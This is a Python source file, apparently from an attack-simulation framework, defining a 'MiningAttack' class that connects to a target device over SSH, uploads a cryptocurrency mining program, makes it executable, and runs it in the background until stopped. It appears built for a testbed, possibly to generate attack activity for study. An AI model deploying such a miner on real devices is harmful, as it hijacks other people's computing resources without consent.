import socket
import traceback
from threading import Thread

from paramiko import SSHException

from attacks.attack_type import AttackType
from attacks.scripts.base_attack import BaseAttack
from defs.remote import Remote
from defs.std_streams import StdStreams
from defs.utils import log
from defs.config import Config as Cfg


class MiningAttack(BaseAttack):
	"""
	Attack that sends a cryptocurrency mining program to the target device and runs it there
	"""

	# Arguments to pass to the mining program
	MINER_ARGS = "--benchmark --cpu-priority 2"

	remote: Remote
	active: bool
	streams: StdStreams

	def __init__(self):
		self.active = False

	def get_attack_name(self) -> str:
		return "Mining"

	def is_synchronous(self) -> bool:
		return False

	def start(self, device_num: int) -> bool:
		try:
			self.remote = Remote.connect_end_device(device_num)
		except (SSHException, TimeoutError, socket.timeout, socket.error):
			log("Error: Couldn't connect to a remote device to run the mining attack. Full exception:")
			print(traceback.format_exc())
			return False

		self.remote.cd("~")

		self.remote.send_file(Cfg.get().get_file_to_send(AttackType.MINING, device_num),
			Cfg.get().mining_remote_file)
		self.remote.sftp.chmod(Cfg.get().mining_remote_file, 0o755)

		self.active = True
		self.streams = self.remote.exec_command_async("./" + Cfg.get().mining_remote_file + " " + self.MINER_ARGS)

		# Use a separate thread to check for errors once the script exits
		Thread(target=self._check_exit, args=[self.streams]).start()

		return True

	def end(self):
		if self.active:
			# Close the channel. Since exec_command_async creates a virtual terminal, this kills said terminal too,
			# which immediately stops the mining program.
			self.remote.close()
			self.active = False
